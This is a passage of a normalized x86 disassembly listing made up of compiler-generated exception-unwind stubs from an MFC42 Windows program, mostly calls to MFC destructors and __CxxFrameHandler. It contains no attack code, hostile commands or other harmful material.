jmp Ordinal_MFC42_800
sub_40dd08
mov eax r--data
jmp __CxxFrameHandler
sub_40dd20
lea ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40dd28
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_668
sub_40dd30
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_800
sub_40dd38
lea ecx [ ebp + 0x10 ]
jmp Ordinal_MFC42_800
sub_40dd40
mov eax r--data
jmp __CxxFrameHandler
sub_40dd50
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40dd58
mov eax r--data
jmp __CxxFrameHandler
sub_40dd70
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40dd78
lea ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40dd80
lea ecx [ ebp - 0x44 ]
jmp Ordinal_MFC42_668
sub_40dd88
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40dd90
mov ecx [ ebp - 0x48 ]
jmp Ordinal_MFC42_800
sub_40dd98
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40dda0
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_668
sub_40dda8
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40ddb0
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40ddb8
mov eax r--data
jmp __CxxFrameHandler
sub_40ddd0
lea ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40ddd8
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_668
sub_40dde0
mov eax r--data
jmp __CxxFrameHandler
sub_40ddf0
lea ecx [ ebp - 0x274 ]
jmp Ordinal_MFC42_800
sub_40ddfb
lea ecx [ ebp - 0x288 ]
jmp Ordinal_MFC42_800
sub_40de06
lea ecx [ ebp - 0x280 ]
jmp Ordinal_MFC42_800
sub_40de11
lea ecx [ ebp - 0x278 ]
jmp Ordinal_MFC42_800
sub_40de1c
mov eax r--data
jmp __CxxFrameHandler
sub_40de30
lea ecx [ ebp - 0x5c ]
jmp Ordinal_MFC42_800
sub_40de38
lea ecx [ ebp - 0x44 ]
jmp Ordinal_MFC42_668
sub_40de40
lea ecx [ ebp - 0x58 ]
jmp Ordinal_MFC42_800
sub_40de48
lea ecx [ ebp - 0x58 ]
jmp Ordinal_MFC42_800
sub_40de50
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_668
sub_40de58
lea ecx [ ebp - 0x50 ]
jmp Ordinal_MFC42_800
sub_40de60
lea ecx [ ebp - 0x54 ]
jmp Ordinal_MFC42_800
sub_40de68
mov eax r--data
jmp __CxxFrameHandler
sub_40de80
lea ecx [ ebp - 0x224 ]
jmp Ordinal_MFC42_800
sub_40de8b
lea ecx [ ebp - 0x1f0 ]
jmp Ordinal_MFC42_668
sub_40de96
lea ecx [ ebp - 0x21c ]
jmp Ordinal_MFC42_800
sub_40dea1
lea ecx [ ebp - 0x22c ]
jmp Ordinal_MFC42_800
sub_40deac
lea ecx [ ebp - 0x218 ]
jmp Ordinal_MFC42_800
sub_40deb7
lea ecx [ ebp - 0x1d0 ]
jmp Ordinal_MFC42_640
sub_40dec2
lea ecx [ ebp - 0x1a8 ]
jmp Ordinal_MFC42_640
sub_40decd
mov eax r--data
jmp __CxxFrameHandler
sub_40dee0
lea ecx [ ebp - 0x4818 ]
jmp sub_408a30
sub_40deeb
mov eax r--data
jmp __CxxFrameHandler
sub_40df00
lea ecx [ ebp - 0x54 ]
jmp Ordinal_MFC42_800
sub_40df08
lea ecx [ ebp - 0x50 ]
jmp Ordinal_MFC42_800
sub_40df10
lea ecx [ ebp - 0x48 ]
jmp Ordinal_MFC42_668
sub_40df18
mov eax r--data
jmp __CxxFrameHandler
sub_40df30
lea ecx [ ebp - 0x3c ]
jmp Ordinal_MFC42_800
sub_40df38
lea ecx [ ebp - 0x40 ]
jmp Ordinal_MFC42_800
sub_40df40
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_800
sub_40df48
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_668
sub_40df50
mov eax r--data
jmp __CxxFrameHandler
sub_40df60
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_800
sub_40df68
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_665
sub_40df70
mov eax r--data
jmp __CxxFrameHandler
sub_40df80
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_40df88
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40df90
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_40df98
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40dfa0
lea ecx [ ebp - 0x54 ]
jmp sub_405e00
sub_40dfa8
lea ecx [ ebp - 0x44 ]
jmp Ordinal_MFC42_665
sub_40dfb0
mov eax r--data
jmp __CxxFrameHandler
sub_40dfc0
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_800
sub_40dfc8
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_665
sub_40dfd0
mov eax r--data
jmp __CxxFrameHandler
sub_40dfe0
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_668
sub_40dfe8
lea ecx [ ebp - 0x40 ]
jmp Ordinal_MFC42_800
sub_40dff0
mov eax r--data
jmp __CxxFrameHandler
sub_40e000
lea ecx [ ebp - 0x320 ]
jmp Ordinal_MFC42_800
sub_40e00b
lea ecx [ ebp - 0x31c ]
jmp Ordinal_MFC42_800
sub_40e016
lea ecx [ ebp - 0x2f0 ]
jmp Ordinal_MFC42_640
sub_40e021
lea ecx [ ebp - 0x300 ]
jmp Ordinal_MFC42_640
sub_40e02c
mov eax r--data
jmp __CxxFrameHandler
sub_40e040
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_800
sub_40e048
mov eax r--data
jmp __CxxFrameHandler
sub_40e060
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40e068
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_40e070
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40e078
mov eax r--data
jmp __CxxFrameHandler
sub_40e090
lea ecx [ ebp - 0x44 ]
jmp Ordinal_MFC42_800
sub_40e098
lea ecx [ ebp - 0x38 ]
jmp Ordinal_MFC42_800
sub_40e0a0
lea ecx [ ebp - 0x3c ]
jmp Ordinal_MFC42_800
sub_40e0a8
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_665
sub_40e0b0
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_800
sub_40e0b8
lea ecx [ ebp - 0x30 ]
jmp Ordinal_MFC42_800
sub_40e0c0
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_800
sub_40e0c8
lea ecx [ ebp - 0x40 ]
jmp Ordinal_MFC42_800
sub_40e0d0
mov ecx [ ebp - 0x24 ]
jmp Ordinal_MFC42_800
sub_40e0d8
mov eax r--data
jmp __CxxFrameHandler
sub_40e0f0
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_40e0f8
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40e100
mov ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40e108
mov eax r--data
jmp __CxxFrameHandler
sub_40e120
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40e130
mov eax [ ebp - 0x1c ]
push eax
call sub_4031f0
retn
sub_40e13a
mov eax r--data
jmp __CxxFrameHandler
sub_40e158
mov eax r--data
jmp __CxxFrameHandler
sub_40e178
mov eax r--data
jmp __CxxFrameHandler
sub_40e198
mov eax r--data
jmp __CxxFrameHandler
sub_40e1b0
push sub_4089e0
push 0x200
push 0x14
mov eax [ ebp - 0x10 ]
add eax 0x4
push eax
call sub_40d2ef
retn
sub_40e1c9
push Ordinal_MFC42_800
push 0x200
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0x2804
push eax
call sub_40d2ef
retn
sub_40e1e4
push Ordinal_MFC42_800
push 0x200
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0x300c
push eax
call sub_40d2ef
retn
sub_40e1ff
mov eax r--data
jmp __CxxFrameHandler
sub_40e210
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_40e218
mov eax r--data
jmp __CxxFrameHandler
sub_40e230
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_40e238
mov eax r--data
jmp __CxxFrameHandler
sub_40e250
push sub_4089e0
push 0x200
push 0x14
mov eax [ ebp - 0x10 ]
add eax 0x4
push eax
call sub_40d2ef
retn
sub_40e269
push Ordinal_MFC42_800
push 0x200
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0x2804
push eax
call sub_40d2ef
retn
sub_40e284
push Ordinal_MFC42_800
push 0x200
push 0x4
mov eax [ ebp - 0x10 ]
add eax 0x300c
push eax
call sub_40d2ef
retn
sub_40e29f
mov eax r--data
jmp __CxxFrameHandler
sub_40e2b0
lea ecx [ ebp - 0x348 ]
jmp Ordinal_MFC42_800
sub_40e2bb
lea ecx [ ebp - 0x344 ]
jmp Ordinal_MFC42_800
sub_40e2c6
lea ecx [ ebp - 0x324 ]
jmp Ordinal_MFC42_800
sub_40e2d1
mov eax r--data
jmp __CxxFrameHandler
sub_40e2e0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_815
sub_40e2e8
mov eax r--data
jmp __CxxFrameHandler
sub_40e300
lea ecx [ ebp + 0x10 ]
jmp Ordinal_MFC42_800
sub_40e308
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40e310
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40e318
mov eax r--data
jmp __CxxFrameHandler
sub_40e330
lea ecx [ ebp + 0x10 ]
jmp Ordinal_MFC42_800
sub_40e338
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40e340
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_40e348
mov eax [ ebp - 0x18 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40e35f
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40e367
mov eax r--data
jmp __CxxFrameHandler
sub_40e380
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40e388
mov eax r--data
jmp __CxxFrameHandler
sub_40e3a0
mov eax [ ebp - 0x9c ]
push eax
call Ordinal_MFC42_825
pop ecx
retn
sub_40e3ae
mov eax [ ebp - 0x9c ]
push eax
call Ordinal_MFC42_825
pop ecx
retn
sub_40e3bc
lea ecx [ ebp - 0x88 ]
jmp sub_409590
sub_40e3c7
mov eax r--data
jmp __CxxFrameHandler
sub_40e3e0
lea ecx [ ebp - 0x804 ]
jmp Ordinal_MFC42_800
sub_40e3eb
lea ecx [ ebp - 0x820 ]
jmp Ordinal_MFC42_800
sub_40e3f6
lea ecx [ ebp - 0x824 ]
jmp Ordinal_MFC42_800
sub_40e401
lea ecx [ ebp - 0x81c ]
jmp Ordinal_MFC42_800
sub_40e40c
lea ecx [ ebp - 0x7fc ]
jmp Ordinal_MFC42_800
sub_40e417
lea ecx [ ebp - 0x7f4 ]
jmp Ordinal_MFC42_800
sub_40e422
lea ecx [ ebp - 0x808 ]
jmp Ordinal_MFC42_800
sub_40e42d
lea ecx [ ebp - 0x810 ]
jmp Ordinal_MFC42_800
sub_40e438
lea ecx [ ebp - 0x80c ]
jmp Ordinal_MFC42_800
sub_40e443
lea ecx [ ebp - 0x814 ]
jmp Ordinal_MFC42_800
sub_40e44e
lea ecx [ ebp - 0x824 ]
jmp Ordinal_MFC42_800
sub_40e459
mov ecx [ ebp - 0x818 ]
jmp Ordinal_MFC42_800
sub_40e464
lea ecx [ ebp - 0x824 ]
jmp Ordinal_MFC42_800
sub_40e46f
lea ecx [ ebp - 0x7e0 ]
jmp Ordinal_MFC42_665
sub_40e47a
lea ecx [ ebp - 0x824 ]
jmp Ordinal_MFC42_800
sub_40e485
lea ecx [ ebp - 0x7f0 ]
jmp Ordinal_MFC42_665
sub_40e490
lea ecx [ ebp - 0x818 ]
jmp Ordinal_MFC42_800
sub_40e49b
mov ecx [ ebp - 0x7f8 ]
jmp Ordinal_MFC42_800
sub_40e4a6
lea ecx [ ebp - 0x824 ]
jmp Ordinal_MFC42_800
sub_40e4b1
mov ecx [ ebp - 0x7f8 ]
jmp Ordinal_MFC42_800
sub_40e4bc
mov ecx [ ebp - 0x818 ]
jmp Ordinal_MFC42_800
sub_40e4c7
lea ecx [ ebp - 0x818 ]
jmp Ordinal_MFC42_800
sub_40e4d2
mov eax r--data
jmp __CxxFrameHandler
sub_40e4e8
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_690
sub_40e4f8
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_690
sub_40e500
lea ecx [ ebp - 0x4c ]
jmp Ordinal_MFC42_665
sub_40e508
mov eax r--data
jmp __CxxFrameHandler
sub_40e528
lea ecx [ ebp - 0x40 ]
jmp Ordinal_MFC42_690
sub_40e530
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_665
sub_40e538
mov eax r--data
jmp __CxxFrameHandler
sub_40e550
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_641
sub_40e558
mov eax r--data
jmp __CxxFrameHandler
sub_40e570
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40e578
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40e580
mov eax r--data
jmp __CxxFrameHandler
sub_40e590
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40e598
lea ecx [ ebp - 0x214 ]
jmp Ordinal_MFC42_800
sub_40e5a3
mov eax [ ebp - 0x210 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40e5bd
mov eax r--data
jmp __CxxFrameHandler
sub_40e5d0
mov ecx [ ebp - 0x10 ]
add ecx 0x9c
jmp Ordinal_MFC42_800
sub_40e5de
mov ecx [ ebp - 0x10 ]
add ecx 0xa0
jmp Ordinal_MFC42_800
sub_40e5ec
mov ecx [ ebp - 0x10 ]
add ecx 0xa4
jmp Ordinal_MFC42_800
sub_40e5fa
mov ecx [ ebp - 0x10 ]
add ecx 0xa8
jmp Ordinal_MFC42_800
sub_40e608
mov ecx [ ebp - 0x10 ]
add ecx 0xcc
jmp Ordinal_MFC42_800
sub_40e616
mov ecx [ ebp - 0x10 ]
add ecx 0xd0
jmp Ordinal_MFC42_800
sub_40e624
mov eax r--data
jmp __CxxFrameHandler
sub_40e630
mov ecx [ ebp - 0x10 ]
add ecx 0x9c
jmp Ordinal_MFC42_800
sub_40e63e
mov ecx [ ebp - 0x10 ]
add ecx 0xa0
jmp Ordinal_MFC42_800
sub_40e64c
mov ecx [ ebp - 0x10 ]
add ecx 0xa4
jmp Ordinal_MFC42_800
sub_40e65a
mov ecx [ ebp - 0x10 ]
add ecx 0xa8
jmp Ordinal_MFC42_800
sub_40e668
mov ecx [ ebp - 0x10 ]
add ecx 0xcc
jmp Ordinal_MFC42_800
sub_40e676
mov ecx [ ebp - 0x10 ]
add ecx 0xd0
jmp Ordinal_MFC42_800
sub_40e684
mov eax r--data
jmp __CxxFrameHandler
